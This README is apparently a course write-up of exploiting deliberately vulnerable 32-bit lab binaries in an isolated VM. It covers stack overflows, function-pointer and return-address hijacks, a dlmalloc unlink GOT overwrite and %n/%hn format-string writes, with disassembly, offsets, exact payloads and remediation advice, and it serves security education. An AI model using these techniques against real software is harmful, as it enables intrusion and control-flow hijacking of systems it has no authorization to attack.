# Hole-In-Bin — Reverse Engineering & Binary Exploitation

> **Educational project.** Every piece of analysis and exploitation here was performed
> **only** against the binaries shipped inside the provided, isolated VM
> (`/opt/hole-in-bin`). Nothing here targets any live, third-party, or production system.
> The techniques are the same ones used by vulnerability researchers and red teams — used
> here solely to learn how the bugs work and how to fix them.

The project is a ladder of 12 x86 (32-bit) binaries, `ex00` … `ex11`. Each prints a specific
"win" message once you satisfy its condition (overwrite a variable, redirect control flow,
pop a shell, …). Per the project rules, **all** reverse engineering was done with
**disassemblers/debuggers only** (objdump, GDB, Ghidra Listing view) — **no decompiler**.

## Table of Contents
- [Environment & Tooling](#environment--tooling)
- [Binary Protections (global)](#binary-protections-global)
- [Methodology](#methodology)
- [Challenge Walkthroughs](#challenge-walkthroughs)
  - [ex00 — overwrite an adjacent variable](#ex00--overwrite-an-adjacent-variable)
- [Remediation Suggestions](#remediation-suggestions)
- [Ethical Hacking Report](#ethical-hacking-report)
- [Bonus](#bonus)
- [Appendix A — Extracting the binaries without booting the VM](#appendix-a--extracting-the-binaries-without-booting-the-vm)

---

## Environment & Tooling

- **Target VM:** provided `hole-in-bin` image (VirtualBox OVA). Login `user` / `user`.
  Userland is 32-bit glibc **2.19** (Ubuntu 14.04-era). The VM ships `gdb`, `ltrace`,
  `strace`, `objdump`, `python`/`python3` — all allowed tools.
- **Challenge binaries:** `/opt/hole-in-bin/ex00 … ex11`, each with a `bin` + `README.txt`.
- **Allowed tools:** Ghidra (Listing/Assembly view **only**), GDB, PEDA, radare2, Python, Bash.
- **Prohibited:** decompilers / decompiler views, automated external exploitation frameworks.

**Repo layout**

```
challenges/exNN/bin         the target binary (copied out of the VM)
challenges/exNN/README.txt  the original per-challenge brief
scripts/exNN.py             payload generator for challenge NN
scripts/checksec.sh         readelf-based protection check (no external deps)
scripts/runlocal.sh         run a 32-bit VM binary locally under the VM's own loader+libc
```

> **Where exploits run:** the audit is performed **inside the VM**, so the exploits are
> written to run there (`python3 scripts/exNN.py | /opt/hole-in-bin/exNN/bin`). For
> development they were also verified on the host by running each binary under the VM's
> **exact** extracted loader (`ld-2.19.so`) and libc (`libc-2.19.so`) via
> `scripts/runlocal.sh`, so local results match the VM. Address-dependent exploits assume
> **ASLR disabled** in the VM (`sysctl kernel.randomize_va_space=0`), which is the standard
> configuration for these exercises — confirm with `cat /proc/sys/kernel/randomize_va_space`.

---

## Binary Protections (global)

Measured with `scripts/checksec.sh` (see script for how each is derived from `readelf`):

| Binary | Arch | NX (exec-stack) | PIE | Stack Canary | RELRO |
|--------|------|-----------------|-----|--------------|-------|
| ex00–ex11 | i386 | **No** (stack is executable) | **No** (fixed addresses) | **No** | **No** |

Consequences we rely on throughout:

- **No canary** → a stack buffer overflow can reach the saved return address with no detection.
- **No PIE** → code, PLT/GOT and global addresses are fixed and known at link time
  (readable with `objdump`/`readelf`), so no leak is needed to find them.
- **NX off** → the stack is executable, so injected shellcode on the stack can be run (ex09).
- **No RELRO** → the GOT is writable, enabling GOT-overwrite via format-string/overflow bugs.

---

## Methodology

The same disciplined loop was applied to every binary:

1. **Recon** — `file`, `scripts/checksec.sh`, `readelf -a`, `strings`: architecture, protections, win strings.
2. **Static analysis** — `objdump -d -M intel` (and GDB `disassemble` / Ghidra Listing view) to
   map `main`, locate the vulnerable input call, and read the win condition straight from assembly.
3. **Offset discovery** — derive the exact buffer→target distance from the stack frame
   (`sub esp, N` + the `lea`/`mov` offsets), cross-checked dynamically in GDB with a cyclic pattern.
4. **Exploit development** — craft the payload (padding + value/address/shellcode), scripted in Python.
5. **Verification** — run the exploit and confirm the exact win message.
6. **Remediation** — note the source-level fix and the compiler/OS hardening that would stop it.

---

## Challenge Walkthroughs

### ex00 — overwrite an adjacent variable

**Goal (`README.txt`):** see *“you have changed the 'modified' variable”*.

**Vulnerability class:** stack buffer overflow into an adjacent local variable (CWE-787, out-of-bounds write) via the unbounded `gets()`.

**Disassembly (`objdump -d -M intel challenges/ex00/bin`, `main`):**

```asm
80483f4 <main>:
  80483f4: push   ebp
  80483f5: mov    ebp,esp
  80483f7: and    esp,0xfffffff0        ; align stack to 16 bytes
  80483fa: sub    esp,0x60              ; reserve 0x60 bytes for locals
  80483fd: mov    DWORD PTR [esp+0x5c],0x0   ; modified = 0
  8048405: lea    eax,[esp+0x1c]        ; eax = &buffer
  8048409: mov    DWORD PTR [esp],eax   ; arg0 = &buffer
  804840c: call   804830c <gets@plt>    ; gets(buffer)  <-- no bounds check
  8048411: mov    eax,DWORD PTR [esp+0x5c]   ; eax = modified
  8048415: test   eax,eax               ; modified == 0 ?
  8048417: je     8048427 <main+0x33>   ; if 0 -> "Try again?"
  8048419: mov    DWORD PTR [esp],0x8048500  ; else -> win string
  8048420: call   804832c <puts@plt>
  ...
  8048427: mov    DWORD PTR [esp],0x8048529  ; "Try again?"
  804842e: call   804832c <puts@plt>
```

**Reading it (the instructions that matter for the role-play):**

- `sub esp,0x60` reserves the local frame. Within it the compiler placed the input **buffer at `esp+0x1c`** and the **`modified` flag at `esp+0x5c`**.
- `lea eax,[esp+0x1c]` / `mov [esp],eax` / `call gets@plt` passes `&buffer` to `gets()`. `gets()` copies stdin **with no length limit**, so we control everything from `esp+0x1c` upward.
- `test eax,eax` + `je` is the check: if `modified` is still `0` we lose, otherwise we win.

**Offset:** `modified − buffer = 0x5c − 0x1c = 0x40 = 64` bytes. So 64 bytes fill the buffer up to (but not into) `modified`; the **65th** byte lands in `modified`.

**Exploit (`scripts/ex00.py`):** 64 padding bytes + 1 non-zero byte.

```bash
# In the VM:
python3 scripts/ex00.py | /opt/hole-in-bin/ex00/bin
# Local (dev) verification against the VM's own libc:
python3 scripts/ex00.py | scripts/runlocal.sh challenges/ex00/bin
```

**Result (verified):**
```
you have changed the 'modified' variable
```
(64 bytes alone still prints `Try again?`, confirming the offset is exact.)

**Key takeaway:** `gets()` is unfixably unsafe — it cannot know the buffer size. An
overflow doesn't need to reach the return address to matter; corrupting an *adjacent*
variable is already a security-relevant state change (here it flips an authorization-style flag).

---

### ex01 — overwrite a variable with an exact value

**Goal (`README.txt`):** see *“you have correctly got the variable to the right value”*.

**Vulnerability class:** stack buffer overflow via `strcpy()` of an attacker-controlled `argv[1]` (CWE-121).

**Disassembly (`main`, key lines):**

```asm
 804846d: cmp    DWORD PTR [ebp+0x8],0x1     ; if (argc == 1)
 8048471: jne    8048487
 8048482: call   errx@plt                    ;   errx(1, "...") — needs an argument
 8048487: mov    DWORD PTR [esp+0x5c],0x0    ; modified = 0
 804848f: mov    eax,DWORD PTR [ebp+0xc]     ; eax = argv
 8048492: add    eax,0x4                     ; &argv[1]
 8048495: mov    eax,DWORD PTR [eax]         ; argv[1]
 8048497: mov    DWORD PTR [esp+0x4],eax     ; src  = argv[1]
 804849b: lea    eax,[esp+0x1c]             ; dst  = &buffer
 80484a2: call   strcpy@plt                  ; strcpy(buffer, argv[1])  <-- overflow
 80484a7: mov    eax,DWORD PTR [esp+0x5c]    ; eax = modified
 80484ab: cmp    eax,0x61626364             ; modified == 0x61626364 ?
 80484b0: jne    80484c0
 80484b2: ... puts("you have correctly got the variable to the right value")
```

**Reading it:** `[ebp+0x8]` is `argc`, `[ebp+0xc]` is `argv`; `add eax,4` + deref selects
`argv[1]`. `strcpy` copies it into `buffer` at `esp+0x1c` with no length check. The win test is
an **exact** compare against `0x61626364` (not just non-zero like ex00).

**Offset:** `0x5c − 0x1c = 64` bytes. The 4 bytes after the padding must be the little-endian
encoding of `0x61626364`, i.e. the ASCII `"dcba"` (`64 63 62 61`). `strcpy` stops at a NUL, and
our payload has none, so it copies in full.

**Exploit (`scripts/ex01.py`):** `"A"*64 + "dcba"`, passed as the argument.

```bash
/opt/hole-in-bin/ex01/bin "$(python3 scripts/ex01.py)"
# local: scripts/runlocal.sh challenges/ex01/bin "$(python3 scripts/ex01.py)"
```

**Result (verified):** `you have correctly got the variable to the right value`
(a wrong value prints `Try again, you got 0x……`, which also leaks the overwritten bytes — handy for debugging the offset).

**Key takeaway:** `strcpy()` has the same flaw as `gets()` — it copies until a NUL with no
destination bound. Overflows can place a **precise** value, not just garbage, which is what makes
them usable to control program logic (and, later, addresses).

---

### ex02 — overwrite a variable from an environment variable

**Goal (`README.txt`):** see *“you have correctly modified the variable”*.

**Vulnerability class:** stack buffer overflow via `strcpy()` of an attacker-controlled **environment variable** (CWE-121).

**Disassembly (`main`, key lines):**

```asm
 804849d: mov    DWORD PTR [esp],0x80485e0   ; "GREENIE"
 80484a4: call   getenv@plt                  ; p = getenv("GREENIE")
 80484a9: mov    DWORD PTR [esp+0x5c],eax
 80484ad: cmp    DWORD PTR [esp+0x5c],0x0    ; p == NULL ?
 80484b2: jne    80484c8
 80484c3: call   errx@plt                    ;   errx(1,"please set the GREENIE ...")
 80484c8: mov    DWORD PTR [esp+0x58],0x0    ; var = 0
 80484d4: mov    [esp+0x4], eax              ; src = p
 80484d8: lea    eax,[esp+0x18]             ; dst = &buffer
 80484df: call   strcpy@plt                  ; strcpy(buffer, p)   <-- overflow
 80484e4: mov    eax,DWORD PTR [esp+0x58]
 80484e8: cmp    eax,0xd0a0d0a              ; var == 0x0d0a0d0a ?
 80484ed: jne    80484fd
 80484ef: ... puts("you have correctly modified the variable")
```

**Reading it:** the tainted input now comes from the **environment** (`getenv("GREENIE")`),
not argv/stdin — a reminder that *any* externally controlled string is attacker input.
`strcpy` copies it into `buffer` at `esp+0x18`; the win test compares the variable at
`esp+0x58` against `0x0d0a0d0a`.

**Offset:** `0x58 − 0x18 = 64` bytes. The target little-endian bytes are `0a 0d 0a 0d`
(`"\n\r\n\r"`). Because those are newline/CR bytes that a shell would mangle, `scripts/ex02.py`
sets the variable itself with `execve` and runs the target.

**Exploit (`scripts/ex02.py`):**

```bash
python3 scripts/ex02.py /opt/hole-in-bin/ex02/bin
# local: python3 scripts/ex02.py scripts/runlocal.sh challenges/ex02/bin
```

**Result (verified):** `you have correctly modified the variable` (no env set → `please set the GREENIE environment variable`).

**Key takeaway:** environment variables are untrusted input too. Also: when a payload contains
non-printable bytes, pass it through `execve`/process args rather than fighting shell quoting.

---

### ex03 — overwrite a function pointer (first control-flow hijack)

**Goal (`README.txt`):** see *“code flow successfully changed”*.

**Vulnerability class:** stack overflow overwriting a **function pointer** that is later called indirectly (CWE-121 → CWE-129/-690 indirect call hijack).

**Disassembly:**

```asm
08048424 <win>:                              ; <-- target; prints the win string
 8048424: push ebp ... call puts@plt("code flow successfully changed")

08048438 <main>:
 804843e: sub    esp,0x60
 8048441: mov    DWORD PTR [esp+0x5c],0x0     ; fp = 0
 8048449: lea    eax,[esp+0x1c]              ; &buffer
 8048450: call   gets@plt                     ; gets(buffer)   <-- unbounded
 8048455: cmp    DWORD PTR [esp+0x5c],0x0     ; fp == 0 ?
 804845a: je     8048477
 804845c: ... printf("calling function pointer, jumping to 0x%08x\n", fp)
 8048471: mov    eax,DWORD PTR [esp+0x5c]     ; eax = fp
 8048475: call   eax                          ; <-- indirect call we hijack
```

**Reading it:** `fp` lives at `esp+0x5c`. After `gets`, if `fp != 0`, `main` does
`call eax` with `eax = fp`. The `ff d0` byte sequence is `call eax` — an **indirect call**
through attacker-controllable memory. Point it at `win` and we win.

**Offset:** `0x5c − 0x1c = 64` bytes, then 4 bytes = `&win = 0x08048424` (little-endian
`24 84 04 08`). No PIE ⇒ this address is fixed, no leak needed.

**Exploit (`scripts/ex03.py`):** `"A"*64 + p32(0x08048424)`.

```bash
python3 scripts/ex03.py | /opt/hole-in-bin/ex03/bin
```

**Result (verified):**
```
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

**Key takeaway:** this is the first true **control-flow hijack** — we didn't just change data,
we changed *where the program executes*. A stored code pointer (function pointer, vtable, callback)
is as sensitive as the return address. `%08x` here even echoes our overwritten pointer back, confirming control.

---

### ex04 — overwrite the saved return address

**Goal (`README.txt`):** see *“code flow successfully changed”*.

**Vulnerability class:** classic stack buffer overflow overwriting the **saved return address** (CWE-121 → EIP control).

**Disassembly:**

```asm
080483f4 <win>: ... puts("code flow successfully changed")

08048408 <main>:
 804840e: sub    esp,0x50
 8048411: lea    eax,[esp+0x10]     ; &buffer
 8048418: call   gets@plt           ; gets(buffer)   <-- unbounded
 804841d: leave                     ; esp = ebp ; pop ebp
 804841e: ret                       ; pops saved EIP  <-- our target
```

**Reading it:** there's no `modified` variable and no function pointer this time —
`main` just reads into `buffer` and returns. The only code pointer we can corrupt is
`main`'s own **saved return address**, popped by `ret`. Overwrite it with `&win`.

**Offset = 76 bytes.** `buffer` is at `esp+0x10`; the saved return address is at
`[ebp+4]`. Because of the 16-byte stack alignment (`and esp,0xfffffff0`) the gap works out
to 76. I confirmed it dynamically rather than trusting arithmetic: a 4-byte marker placed at
offset 76 appears verbatim in the instruction pointer — the kernel fault log shows
`ip 0000000042424242` when the marker is `0x42424242`.

**Exploit (`scripts/ex04.py`):** `"A"*76 + p32(0x080483f4)`.

```bash
python3 scripts/ex04.py | /opt/hole-in-bin/ex04/bin
```

**Result (verified):** `code flow successfully changed`.
> Note: when stdout is a **pipe** it is block-buffered, so `win()` prints into the buffer but
> the crash on `win`'s own `ret` (returning to leftover bytes) can discard the unflushed line.
> On a terminal — i.e. in the VM — it is line-buffered and prints immediately. Verified locally
> by attaching a PTY (`script`), which shows `code flow successfully changed`.

**Key takeaway:** the saved return address is the canonical overflow target. Finding the exact
offset is the crux — derive it from the frame, then **confirm it dynamically** (GDB `pattern`, or
reading the faulting EIP) because stack alignment makes the arithmetic environment-dependent.

---

### ex05 — `sprintf` overflow (and a format-string bug)

**Goal (`README.txt`):** see *“you have hit the target correctly :)”*.

**Vulnerability class:** two bugs in one `sprintf(buf, user)` call — an **unbounded write**
(CWE-121) *and* a **format-string** bug (CWE-134, attacker controls the format).

**Disassembly (`vuln`, called as `vuln(argv[1])`):**

```asm
080483f4 <vuln>:
 80483f7: sub    esp,0x68
 80483fa: mov    DWORD PTR [ebp-0xc],0x0     ; target = 0
 8048401: mov    eax,DWORD PTR [ebp+0x8]     ; arg (= argv[1])
 8048404: mov    DWORD PTR [esp+0x4],eax     ; sprintf 2nd arg = FORMAT = arg
 8048408: lea    eax,[ebp-0x4c]             ; dst buffer
 804840e: call   sprintf@plt                 ; sprintf(buffer, arg)   <-- bug
 8048413: mov    eax,DWORD PTR [ebp-0xc]
 8048416: cmp    eax,0xdeadbeef             ; target == 0xdeadbeef ?
 804841b: jne    8048429
 804841d: ... puts("you have hit the target correctly :)")
```

**Reading it:** `sprintf` is called with only two arguments — destination and
`arg` — so `arg` **is the format string**. The destination `buffer` is at `ebp-0x4c`,
the `target` at `ebp-0xc`.

**Primary exploit — literal overflow.** A plain string has no `%`, so `sprintf` copies it
verbatim into the 64-byte buffer and keeps going into `target`. Offset
`(ebp-0xc) − (ebp-0x4c) = 0x40 = 64`, then the 4 bytes `ef be ad de` (`0xdeadbeef`, no NUL).

```bash
/opt/hole-in-bin/ex05/bin "$(python3 scripts/ex05.py)"
```

**Result (verified):** `you have hit the target correctly :)`.

**Bonus — format-string path.** Because `arg` is the format, you can avoid the overflow
entirely and write `0xdeadbeef` into `target` with `%n`. Put `&target` into the buffer, use a
large field width to reach the needed byte count, then `%hn` twice (two 16-bit "short writes",
`0xbeef` and `0xdead`) to avoid printing billions of characters. This needs the fixed stack
address of `target` (ASLR off in the VM: find it once in GDB — `p &target`), e.g.
`[addr+2][addr]` + width + `%hn%hn` with the right argument index. Documented here as an
alternative; the literal overflow is simpler and address-independent.

**Key takeaway:** `sprintf(dst, user)` is doubly dangerous — never pass untrusted data as a
format. Use `sprintf(dst, "%s", user)` *and* a bounded `snprintf`.

---

### ex06 — heap overflow: dlmalloc `unlink()` write-what-where

**Goal (`README.txt`):** see *“that wasn't too bad now, was it?”*.

**Vulnerability class:** heap buffer overflow corrupting allocator metadata, exploited through the
old dlmalloc **`unlink()`** macro (CWE-122 heap overflow → arbitrary write → control-flow hijack).
This is exploit-education **heap3** (the debug info confirms `heap3/heap3.c`).

**Program (`main`):** `b1=malloc(0x20); b2=malloc(0x20); b3=malloc(0x20);`
`strcpy(b1,argv[1]); strcpy(b2,argv[2]); strcpy(b3,argv[3]);`
`free(b3); free(b2); free(b1); puts("...")`. A `winner()` at `0x08048864` prints the target
message. The allocator is **statically compiled into the binary**, so its behaviour is identical
on every machine — an exploit that works here works byte-for-byte in the VM.

**Fixed addresses (no PIE, ASLR off):** heap base `0x804c000`; `b1=0x804c008`, `b2=0x804c030`,
`b3=0x804c058`; chunk3 header at `0x804c050/0x804c054`; `puts@GOT = 0x804b128`.

**The primitive.** Old dlmalloc has no safe-unlinking checks:
```
unlink(P):  FD = P->fd;  BK = P->bk;  *(FD+12) = BK;  *(BK+8) = FD;
```
Pick `FD = puts_GOT − 12` and `BK = X` ⇒ the first write sets `puts_GOT = X`. We then make `puts`
jump to `X`. Because `unlink` also does a *second* write (`*(BK+8)=FD`) and `winner` is in
read-only `.text`, `X` can't be `winner` directly — so `X` is a tiny **trampoline on the heap**
(`jmp +0xa ; push winner ; ret`) and the second write lands harmlessly in its padding.

**Making it fire cleanly** (the hard part):
- *NUL-free:* `strcpy`/`argv` stop at NUL, so every dword in the payload avoids `0x00`
  (we use `0xfffffff8 = −8`, `0xfffffffc`, addresses like `0x804b11c`, etc.).
- *Trigger on the first free:* frees run `b3,b2,b1`; firing the unlink during `free(b3)` means the
  later frees can't clobber our crafted `fd/bk`. We overflow `b2` to set
  `chunk3->prev_size = −8` (so the fake chunk `P = chunk3+8 = b3`) and clear `chunk3`'s
  `PREV_INUSE` bit, which makes `free(b3)` back-consolidate and `unlink(P)`.
- *Survive the rest of `free`:* we make the bogus `nextchunk` look in-use (odd byte at
  `nextchunk+4`) so `free` skips its forward-consolidation unlink and returns normally.
- *Executable heap:* a 32-bit exec-stack binary runs with the kernel's `READ_IMPLIES_EXEC`
  personality on real i386 Linux, so the heap trampoline is runnable.

**Exploit (`scripts/ex06.py`):** builds the three args and `execve`s the target.

```bash
python3 scripts/ex06.py /opt/hole-in-bin/ex06/bin
```

**Result (verified):** `that wasn't too bad now, was it? @ <number>`.
Verified end-to-end on the host by emulating the VM's i386 personality
(`READ_IMPLIES_EXEC` + ASLR off); in GDB the sequence is: `free(b3)` runs `unlink` →
`puts@GOT` becomes `0x804c068` (the trampoline) → `puts(...)` jumps there → `push winner; ret` →
the message prints. Requires `kernel.randomize_va_space = 0` in the VM (the default for these labs).

**Key takeaway:** heap metadata is as attacker-reachable as stack data. Overflowing one chunk into
the next chunk's header turns `free()` into an arbitrary write. Modern allocators add safe-unlinking
(`corrupted double-linked list` checks), heap canaries and pointer mangling precisely to kill this.

---

### ex07 — format string: write a value with `%n`

**Goal (`README.txt`):** see *“you have modified the target :)”*.

**Vulnerability class:** format-string vulnerability (CWE-134) — `printf(user_input)` with no fixed
format — used to perform an arbitrary memory write via `%n`.

**Disassembly (`vuln`):**

```asm
 8048477: call   fgets@plt            ; fgets(buf[ebp-0x208], 0x200, stdin)
 8048485: call   printf@plt           ; printf(buf)   <-- user controls the FORMAT
 804848a: mov    eax,ds:0x80496e4     ; eax = target (global)
 804848f: cmp    eax,0x40             ; target == 0x40 ?
 8048494: ... puts("you have modified the target :)")
```

**Reading it:** `printf` is called with **one** argument — the user buffer — so the buffer is the
format string. `target` is a global at `0x080496e4`; we need it to equal `0x40` (64).

**Finding the offset.** Feeding `AAAA.%x.%x.%x.%x…` prints `…41414141…` as the **4th** value,
so our buffer begins at `printf` argument **#4**; `%4$n` therefore writes to the pointer we place
at the start of the buffer.

**Exploit (`scripts/ex07.py`):** `p32(&target) + "%60d" + "%4$n"`.
`%n` writes the number of characters printed so far: `4` (the address bytes) `+ 60` (the padded
`%60d`) `= 64 = 0x40`, written into `target`.

```bash
python3 scripts/ex07.py | /opt/hole-in-bin/ex07/bin
```

**Result (verified):** `you have modified the target :)`.

**Key takeaway:** never pass user data as a format string. `%n` turns a "harmless" logging bug into
an **arbitrary write**: the attacker chooses both the address (placed in the buffer) and the value
(controlled by the printed width). The fix is trivial: `printf("%s", buf)`.

---

### ex08 — format string: large value via two `%hn` short writes

**Goal (`README.txt`):** see *“you have modified the target :)”*.

**Vulnerability class:** format-string vulnerability (CWE-134), same bug as ex07 but now writing a
**large, specific value** — demonstrating the *short-write* technique.

**Disassembly (`vuln`):** `fgets(buf,0x200,stdin)` → `printbuffer(buf)` which does `printf(buf)` →
`if (target == 0x01025544) puts("you have modified the target :)")`. `target` is at `0x080496f4`.

**Why it's harder than ex07:** the required value `0x01025544` ≈ 16.9 million. A single `%n`
would need to print ~17M characters. Instead we write the value **16 bits at a time** with `%hn`:

| write | value | address |
|-------|-------|---------|
| high half | `0x0102` | `target+2 = 0x080496f6` |
| low half  | `0x5544` | `target   = 0x080496f4` |

**Offset:** the extra `printbuffer` frame pushes the buffer to `printf` argument **#12**
(`AAAA%12$x` → `AAAA41414141`).

**Exploit (`scripts/ex08.py`):** place both target addresses at the buffer start, then write the
**smaller** half first so the cumulative `%n` counter only grows:

```
[&target+2][&target] %250c%12$hn %21570c%13$hn
 8 chars -> +250 = 258 = 0x0102 -> target+2
         -> +21570 = 21828 = 0x5544 -> target
=> target = 0x01025544
```

```bash
python3 scripts/ex08.py | /opt/hole-in-bin/ex08/bin
```

**Result (verified):** `you have modified the target :)`.

**Key takeaway:** `%hn`/`%hhn` let an attacker write a full 32-bit value in 16- or 8-bit pieces
with only modest output, so "the value is too big to print" is **not** a mitigation. Remove the
bug (`printf("%s", buf)`); defense-in-depth: FORTIFY (`%n` in writable-memory format strings is
rejected under `_FORTIFY_SOURCE`).

---

<!-- ex09 … ex11 walkthroughs are added as each challenge is completed. -->
_ex09 … ex11: in progress._

---

## Remediation Suggestions

_General + per-vulnerability fixes. Filled in as challenges complete. Baseline for ex00:_

- **Never use `gets()`** — replace with `fgets(buf, sizeof(buf), stdin)` which bounds the read.
- Build with modern defenses: `-fstack-protector-strong` (canary), `-D_FORTIFY_SOURCE=2`,
  `-Wl,-z,relro,-z,now` (full RELRO), non-executable stack (default), and `-pie -fPIE` + ASLR.
- Compiler warnings (`-Wall -Wextra`) flag `gets()` as dangerous; treat them as errors in CI.

---

## Ethical Hacking Report

### Importance of proper authorization
_TODO._

### Legal and ethical boundaries
_TODO._

### Responsible disclosure practices
_TODO._

---

## Bonus
- **Extracted the challenge binaries straight from the OVA disk image without booting the VM**
  (no root/sudo, no VirtualBox) — see [Appendix A](#appendix-a--extracting-the-binaries-without-booting-the-vm).
- Alternative exploitation paths, custom shellcode, and ROP are documented per challenge where applicable.

---

## Appendix A — Extracting the binaries without booting the VM

To analyze the binaries on the host, they were pulled directly out of the provided
`hole-in-bin.ova` using only user-space tools (no VirtualBox, no root):

1. **Unpack the OVA** (it's a tar): `tar xf hole-in-bin.ova` → `hole-in-bin-disk001.vmdk` (+ `.ovf`, `.mf`).
2. **Decompress the disk** — the VMDK is `streamOptimized` (gzip-compressed sparse), so convert
   to raw: `qemu-img convert -f vmdk -O raw hole-in-bin-disk001.vmdk disk.raw`.
   (`qemu-img` was unpacked locally from its `.deb` with `dpkg-deb -x`, so no `sudo` was needed.)
3. **Find the filesystem** — `fdisk -l disk.raw` shows the root is inside **LVM** (partition 5).
   The LVM metadata (stored as plain text in the PV) gives `pe_start = 384` and the `root` LV
   starting at physical extent 0 → the ext4 superblock sits at sector `501760 + 384 = 502144`.
4. **Carve the ext4 LV** with `dd` (byte-precise offset, sparse output).
5. **Read it without mounting** using `debugfs` from `e2fsprogs`:
   `debugfs -R "rdump /opt/hole-in-bin ./challenges" disk-root.ext4`.

The VM's loader (`ld-2.19.so`) and libc (`libc-2.19.so`) were extracted the same way so the
binaries can be run locally in a VM-faithful environment via `scripts/runlocal.sh`.
